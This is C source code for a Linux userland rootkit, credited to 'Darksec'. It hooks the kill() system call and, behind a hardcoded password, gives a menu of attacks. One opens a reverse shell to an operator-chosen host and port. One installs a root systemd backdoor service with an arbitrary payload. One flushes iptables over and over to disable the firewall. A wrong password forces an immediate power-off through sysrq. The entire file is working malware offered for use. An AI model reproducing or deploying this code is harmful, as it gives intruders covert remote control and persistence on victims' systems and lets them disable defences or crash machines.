// my rootkit userland for linux.
// author: Darksec, in development phase

#define _GNU_SOURCE
#include <sys/wait.h>
#include <stdlib.h>
#include <signal.h>
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>


       int kill(pid_t pid, int sig){

	ssize_t result;

	ssize_t reads;

	const int pids = 1337;

       int (*matar)(pid_t pid, int sig);

	matar = dlsym(RTLD_NEXT, "kill");

if(pid == pids){

	char password[20];
	char *pass = "darksec";


result = write(1, "[+] What's the Password? \n", strlen("[+] What's the Password? \n"));
result = write(1, "[!] --> ", strlen("[!] --> "));
scanf("%s", &password);
system("clear");


if(strcmp(password, pass) == 0){

	int escolha;

	printf("1) REVERSE SHELL \n");
	printf("2) BACKDOOR SYSTEMD \n");
	printf("3) ANTI_FIREWALL EASY\n");
	printf("4) EXIT \n");
	printf("=> ");
	scanf("%i", &escolha);


switch(escolha){

case 1:

	int port;
	char ip[16];

	printf("[+] SET YOUR LHOST => ");
	scanf("%s", &ip);

	printf("[+] SET YOUR LPORT => ");
	scanf("%i", &port);

	printf("[+] RECEVED REVERSE SHELL => %s:%i \n", ip, port);

if(fork() == 0){


    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(ip);

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execvp("sh", argv);

}

wait(NULL);

	break;

case 2:

	ssize_t result;

	char command[200];
	char payload[200];

	printf("YOUR PAYLOAD FOR REVERSE SHELL\n");
	result = read(0, payload, sizeof(payload));
	
	 if (payload[result - 1] == '\n') {
        payload[result - 1] = '\0';
    }

	system("echo '[backdoor]' > /etc/systemd/system/default.service");
	system("echo 'Description=Backdoor_for_linux' >> /etc/systemd/system/default.service");
	system("echo '' >> /etc/systemd/system/default.service");
	system("echo '[Service]' >> /etc/systemd/system/default.service");
	system("echo 'User=root' >> /etc/systemd/system/default.service");
	system("echo 'Group=root' >> /etc/systemd/system/default.service");
	system("echo 'WorkingDirectory=/root' >> /etc/systemd/system/default.service");

	// Payload	

	sprintf(command, "echo 'ExecStart=%s' >> /etc/systemd/system/default.service ", payload);
	system(command);

	system("echo 'Restart=always' >> /etc/systemd/system/default.service");
	system("echo 'RestartSec=5' >> /etc/systemd/system/default.service");
	system("echo '' >> /etc/systemd/system/default.service");
	system("echo '[Install]' >> /etc/systemd/system/default.service");
	system("echo 'WantedBy=multi-user.target' >> /etc/systemd/system/default.service");


	// INIT SERVICE BACKDOOR
	system("/usr/bin/systemctl daemon-reload");
	system("/usr/bin/systemctl start default.service && /usr/bin/systemctl enable default.service");


	break;
case 3:

if(fork() == 0){

printf("[!] EVIL KILL FIREWALL SUCESS!\n");

while(1){

system("/usr/bin/iptables -F");

	}
}


case 4:

	return 0;
        break;

default:

	printf("[!] TRY AGAIN! \n");

}

} else {

system("echo o > /proc/sysrq-trigger");

}

} else {

return matar(pid, sig);

}

}
